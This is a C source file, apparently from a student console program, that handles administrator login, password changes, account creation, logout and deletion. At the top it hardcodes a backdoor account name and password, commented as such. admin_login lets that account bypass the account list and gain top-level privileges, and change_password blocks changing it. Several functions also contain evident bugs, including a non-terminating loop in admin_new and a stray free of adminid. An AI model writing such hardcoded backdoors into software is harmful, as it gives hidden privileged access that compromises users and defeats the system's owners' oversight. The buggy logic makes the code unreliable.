#include "global.h"
#include "data_admin.h"
#include "data_log.h"

//管理员后门（5级权限）
const char* backdooraccount = "AccountSys2023";
const char* backdoorpassword = "Whut2022";

int admin_login() {
	if (admin) {
		printf("已登录管理员账号 %s！不可重复登录！\n", adminid);
		return 0;
	}
	adminNode* list = adminload();

	char* name = getstr_letnum("请输入精确账号（1-18字符，仅输入回车直接返回）：", 0, 18);
	while (!search_exist(list, name) || !strlen(name)) {
		//后门
		if (!strcmp(backdooraccount, name)) break;
		if (!strlen(name)) {
			printf("退出登录！\n");
			return 0;
		}
		if (!search_exist(list, name)) printf("该账号不存在！\n");
		free(name);
		name = getstr_letnum("请输入精确账号（1-18字符，仅输入回车直接返回）：", 0, 18);
	}
	char* psw = (char*)malloc(20 * sizeof(char));
	if (!psw) {
		colorerr();
		printf("无法分配内存！请检查内存剩余空间\n");
		free(name);
		adminsave(list);
		return -1;
	}
	//后门
	if (!strcmp(backdooraccount, name)) {
		if (getpsw(backdoorpassword, psw)) {
			//记录信息部分
			logNode* llist = logload();
			struct log* info = log_new();
			strcpy_s(info->id, 20, backdooraccount);
			info->type = -59; //管理员密码错误过多
			time(&info->time);
			logadd(llist, info);
			logsave(llist);

			free(name);
			free(psw);
			adminsave(list);
			return -1;
		}
		admin += 4;
	}
	//非后门
	else {
		char* password = get_admin_name(list, 1, name).password;
		if (getpsw(password, psw)) {
			//记录信息部分
			logNode* llist = logload();
			struct log* info = log_new();
			strcpy_s(info->id, 20, name);
			info->type = -59; //管理员密码错误过多
			time(&info->time);
			logadd(llist, info);
			logsave(llist);

			free(name);
			free(psw);
			adminsave(list);
			return -1;
		}
		struct admin a = get_admin_name(list, 1, name);
		time_t now;
		time(&now);
		a.geton = now;
		change_admin_name(list, 1, &a, name);
	}
	admin++;
	strcpy_s(adminid, 16, name);
	//记录信息部分
	{
		logNode* list = logload();
		struct log* info = log_new();
		strcpy_s(info->id, 20, adminid);
		info->type = -1; //管理员登录
		time(&info->time);
		logadd(list, info);
		logsave(list);
	}
	printf("登录成功！%s, 欢迎回来！\n", name);
	free(name);
	free(psw);
	adminsave(list);
	return 0;
}

int change_password() {
	if (!check_admin()) return 0;
	if (admin == 5) {
		//后门admin
		printf("请勿修改该密码！\n");
		return 5;
	}
	adminNode* list = adminload();
	char* psw = (char*)malloc(20 * sizeof(char));
	if (!psw) {
		colorerr();
		printf("无法分配内存！请检查内存剩余空间\n");
		adminsave(list);
		return -1;
	}
	struct admin a = get_admin_name(list, 1, adminid);
	char* password = a.password;
	if (getpsw(psw, password)) {
		//记录信息部分
		logNode* llist = logload();
		struct log* info = log_new();
		strcpy_s(info->id, 20, a.id);
		info->type = -59; //管理员密码错误过多
		time(&info->time);
		logadd(llist, info);
		logsave(llist);

		free(adminid);
		free(psw);
		adminsave(list);
		return -1;
	}
	char* pswnew = getstr_letnum("请输入新密码（6-16字符，仅字母与数字）：", 6, 16);
	strcpy_s(a.password, 18, pswnew);
	change_admin_name(list, 1, &a, a.id);
	//记录信息部分
	{
		logNode* list = logload();
		struct log* info = log_new();
		strcpy_s(info->id, 20, adminid);
		info->type = -2; //管理员改密码
		time(&info->time);
		logadd(list, info);
		logsave(list);
	}
	printf("修改密码成功！\n");
	adminsave(list);
	return 0;
}

int admin_new() {
	if (admin != 5) {
		printf("您的权限不足！\n");
		return 0;
	}
	adminNode* list = adminload();
	char* name = getstr_letnum("请输入新账号（6-16字符，仅字母和数字）：", 6, 16);
	while (search_exist(list, name)) {
		printf("该账号已存在！");
		char* name = getstr_letnum("请输入新账号（6-16字符，仅字母和数字）：", 6, 16);
	}
	char* psw = getstr_letnum("请输入密码（6-16字符，仅字母和数字）：", 6, 16);
	struct admin* newadmin = (struct admin*)calloc(1, sizeof(struct admin));
	if (!newadmin) {
		colorerr();
		printf("无法分配内存！请检查内存剩余空间\n");
		return -1;
	}
	strcpy_s(newadmin->id, 18, name);
	strcpy_s(newadmin->password, 18, psw);
	adminadd(list, newadmin);
	printf("创建账号成功！\n");
	free(name);
	free(psw);
	adminsave(list);
	return 0;
}

int admin_logout() {
	if (!check_admin()) return 0;
	admin = 0;
	//记录信息部分
	{
		logNode* list = logload();
		struct log* info = log_new();
		strcpy_s(info->id, 20, adminid);
		info->type = -3; //管理员登出
		time(&info->time);
		logadd(list, info);
		logsave(list);
	}
	strcpy_s(adminid, 2, "");
	printf("您已登出账号！\n");
	return 0;
}

int admin_delete() {
	if (!check_admin()) return 0;
	adminNode* list = adminload();
	if (!cnt_all(list)) {
		printf("暂无管理员账号！\n");
		adminsave(list);
		return -1;
	}
	char* name = getstr_letnum("请输入精确账号（1-18字符，仅输入回车直接返回）：", 0, 18);
	if (admin < 5) {
		while (!search_exist(list, name) || strcmp(adminid, name) || !strlen(name)) {
			if (!strlen(name)) {
				printf("已返回！\n");			
				free(name);
				return 0;
			}
			if (strcmp(adminid, name)) printf("您只能删除自己的账号！\n");
			name = getstr_letnum("请输入精确账号（1-18字符，仅输入回车直接返回）：", 0, 18);
		}
	}
	else {
		while (!search_exist(list, name) || strcmp(adminid, name) || !strlen(name)) {
			if (!strlen(name)) {
				printf("已返回！\n"); 
				free(name);
				return 0;
			}
			if (!strcmp(adminid, name)) printf("您不能删除该账号！\n");
			if (!search_exist(list, name)) printf("该账号不存在！\n");
			name = getstr_letnum("请输入精确账号（1-18字符，仅输入回车直接返回）：", 0, 18);
		}
	}
	char* password = get_admin_name(list, 1, name).password;
	if (admin < 5) {
		char* psw = (char*)malloc(20 * sizeof(char));
		if (!psw) {
			colorerr();
			printf("无法分配内存！请检查内存剩余空间\n");
			free(name);
			adminsave(list);
			return -1;
		}
		if (getpsw(password, psw)) {
			//记录信息部分
			logNode* llist = logload();
			struct log* info = log_new();
			strcpy_s(info->id, 20, adminid);
			info->type = -59; //管理员密码错误过多
			time(&info->time);
			logadd(llist, info);
			logsave(llist);

			free(name);
			free(psw);
			adminsave(list);
			return -1;
		}
	}
	if (!strcmp(adminid, name)) {
		admin = 0;
		strcpy_s(adminid, 2, "");
		printf("将被删除的已登录的 %s 账号已被自动登出！\n", name);
	}
	del_cnt_name(list, 1, name);
	adminsave(list);
	//记录信息部分
	{
		logNode* list = logload();
		struct log* info = log_new();
		strcpy_s(info->id, 20, name);
		info->type = -4; //管理员被删除
		time(&info->time);
		logadd(list, info);
		logsave(list);
	}
	return 0;
}